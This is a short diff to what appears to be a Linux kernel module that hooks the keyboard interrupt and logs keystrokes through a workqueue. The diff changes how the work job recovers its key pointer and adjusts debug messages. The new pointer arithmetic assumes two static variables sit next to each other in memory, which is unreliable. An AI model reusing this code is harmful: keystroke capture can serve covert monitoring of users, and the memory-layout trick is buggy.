@@ -340,9 +340,8 @@ static void		key_job(struct work_struct *work)
 {
 	struct key_map		*key;
 
-	// key = (void*)((size_t)work + sizeof(*work));
-	key = *(struct key_map **)((size_t)work - 8);
-	pr_info("logging key in workjob. task: %p work: %p", work, key);
+	key = (struct key_map *)((size_t)work + (sizeof(struct work_struct)));
+	pr_info("logging key in workjob. task: %p key: %p", work, key);
 	mutex_lock(&lock);
 	// key_create_entry(key);
 	mutex_unlock(&lock);
@@ -354,8 +353,8 @@ DEFINE_SPINLOCK(irq_lock);
 static irqreturn_t	key_handler(int irq, void *dev_id)
 {
 	unsigned int			scancode;
-	static struct key_map		*key;
 	static struct work_struct	task;
+	static struct key_map		*key;
 	static bool			init_done = false;
 
 	spin_lock_irq(&irq_lock);
@@ -371,7 +370,7 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 			INIT_WORK(&task, key_job);
 			init_done = true;
 		}
-		pr_info("origin key: task %p -> key: %p (&key: %p)", &task, key, &key);
+		pr_info("origin key: %p (&key: %p) : task: %p", key, &key, &task);
 		queue_work(workqueue.work, &task);
 
 	} else {
